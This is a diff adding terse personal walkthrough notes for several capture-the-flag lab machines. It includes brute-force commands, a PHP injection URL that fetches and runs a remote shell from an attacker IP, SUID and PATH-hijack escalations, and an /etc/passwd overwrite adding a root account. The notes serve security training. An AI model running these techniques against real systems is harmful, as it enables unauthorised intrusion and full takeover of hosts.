@@ -1510,3 +1510,224 @@ proof.txt  root.txt
 cat proof.txt
 caf81d62fc06840089899268991d5ed4
 ```
+
+## Midnight Sunset 
+1. Port enumeration 
+```
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 9c:fe:0b:8b:8d:15:e7:72:7e:3c:23:e5:86:55:51:2d (RSA)
+|   256 fe:eb:ef:5d:40:e7:06:67:9b:63:67:f8:d9:7e:d3:e2 (ECDSA)
+|_  256 35:83:68:2c:33:8b:b4:6c:24:21:20:0d:52:ed:cd:16 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: Did not follow redirect to http://sunset-midnight/
+| http-robots.txt: 1 disallowed entry 
+|_/wp-admin/
+|_http-server-header: Apache/2.4.38 (Debian)
+3306/tcp open  mysql   MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.5.5-10.3.22-MariaDB-0+deb10u1
+|   Thread ID: 19
+|   Capabilities flags: 63486
+|   Some Capabilities: ConnectWithDatabase, Support41Auth, InteractiveClient, DontAllowDatabaseTableColumn, FoundRows, SupportsTransactions, ODBCClient, LongColumnFlag, Speaks41ProtocolOld, Speaks41ProtocolNew, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, SupportsCompression, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: Hke6}5.$kpqd$%,Kt)j_
+|_  Auth Plugin Name: mysql_native_password
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+2. Change hostname to 'midnight-sunset', perform brute force for mysql password. 
+```
+hydra -l root -P /usr/share/wordlists/rockyou.txt -s 3306 mysql://sunset-midnight/
+
+[3306][mysql] host: sunset-midnight   login: root   password: robert
+```
+
+3. Found update admin password. 
+```
+show databases;
+use wordpress_db;
+select * from wp_users;
+update wp_users set user_pass="5f4dcc3b5aa765d61d8327deb882cf99" WHERE ID=1;
+```
+
+4. Loggin with admin:password in /wp-admin. Reverse shell obtained. 
+a. Upload shell.php in plugins. 
+b. Open it on /wp-includes
+
+5. Performed linpeas, found user jose creds. 
+```
+jose:645dc5a8871d2a4269d4cbe23f6ae103
+```
+6. Logged as jose and found 'status' SUID. Privliege escalation and root. 
+```
+cd /tmp 
+touch service 
+echo "/bin/sh" > service 
+chmod +x ./service 
+PATH=/tmp:$PATH
+
+/usr/bin/status
+```
+
+
+## InfosecPrep
+
+1. Ports enumeration. 
+2. Found secrets.txt
+3. base64 decode (id_rsa for oscp)
+4. ssh -i id oscp@ip (local.txt)
+5. bash -p (bash SUID) (root.txt)
+
+## Seppuku 
+
+1. Found password list (http://192.168.187.90:7601/w/password.lst), bruteforce. 
+```
+hydra -l seppuku -P seppukupass ssh://192.168.187.90
+[22][ssh] host: 192.168.187.90   login: seppuku   password: eeyoree
+```
+
+2. Ssh and found another user samurai password. 
+
+3. Found another user tanto id_rsa at /var/www/html/private. (vi suid for rbash)
+
+4. Ssh and create required files on tanto. 
+```
+tanto@seppuku:~/.cgi_bin$ ls
+bin
+
+chmod 777 bin
+chmod -R 777 ./.cgi_bin/
+
+tanto@seppuku:~/.cgi_bin$ cat bin
+#!/bin/bash
+cp /bin/dash /var/tmp/dash ; chmod u+s /var/tmp/dash
+```
+
+5. Priesc and proof.txt
+```
+samurai@seppuku:/var/tmp$ ./dash -p
+```
+
+## DC 1 
+1. Found drupal 7 exploit - https://github.com/pimps/CVE-2018-7600
+2. Run it and obtained foothold. Use nc reverse. 
+3. Found 'find' SUID. 
+4. Obtained local and root. 
+
+## DC 2
+1. Port enumeration and found wordpress. 
+2. Scan users
+```
+wpscan --enumerate u --url http://dc-2
+
+admin
+tom
+jerry
+```
+3. Created password list. 
+```
+cewl -d 5 -k -w cewl-list.txt http://dc-2/
+```
+4. WPScan password attack 
+```
+wpscan --password-attack wp-login -U dc2users -P cewl-list.txt --url http://dc-2 
+[SUCCESS] - jerry / adipiscing                                                     [SUCCESS] - tom / parturient  
+```
+5. Privelege escalation 
+```
+ssh tom@dc-2 -p 7744
+
+vi
+:set shell=/bin/sh
+:shell
+
+export PATH=/bin/:/usr/bin/:/usr/local/bin:$PATH
+
+su jerry
+password:
+
+rooted.
+```
+
+## Assertion101
+1. Port scan
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 6e:ce:aa:cc:02:de:a5:a3:58:5d:da:2b:ef:54:07:f9 (RSA)
+|   256 9d:3f:df:16:7a:e1:59:58:84:4a:e3:29:8f:44:87:8d (ECDSA)
+|_  256 87:b5:6f:f8:21:81:d3:3b:43:d0:40:81:c0:e3:69:89 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Assertion
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+2. Get reverse shell. 
+```
+http://assertion/index.php?page=' and die(system("whoami")) or '
+
+http://assertion/index.php?page=' and die(system("curl http://192.168.49.119:8000/shell.php | php")) or ' (monkey pentest)
+```
+
+3. Privelege esca. 
+```
+root2:$1$Y6flXwJY$iNJRatoNlIqE/CKcFYz6t0:0:0:root:/root:/bin/bash
+
+python3 -m http.server 8000
+
+aria2c -d /etc -o passwd "http://192.168.45.249:8000/passwd" --allow-overwrite=true
+```
+
+4. Prooft
+```
+su root2
+password: recently created 
+```
+
+## FunboxEasy
+
+1. Found exploit for /store webpage. 
+```
+# Online Book Store 1.0 - Unauthenticated Remote Code Execution
+```
+
+2. Run exploit and obtained foothold. 
+```
+python 47887.py http://192.168.187.111/store
+
+perl -e reverse shell
+
+nc -lvnp 4433
+listening on [any] 4433 ...
+connect to [192.168.45.249] from (UNKNOWN) [192.168.187.111] 53352
+sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+```
+
+3. Priv esc. 
+```
+/usr/bin/time /bin/sh -p
+```
+
+
+## FunboxEasyEnum
+
+1. Directory bruteforce
+```
+gobuster dir -u http://192.168.187.132/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 100 -e
+
+mini.php
+```
+
+2. Upload shell.php (monkey pentest)
+
+3. Obtained foothold and local.txt
+
+4. Use pwnkit for priesc and obtained root.txt 
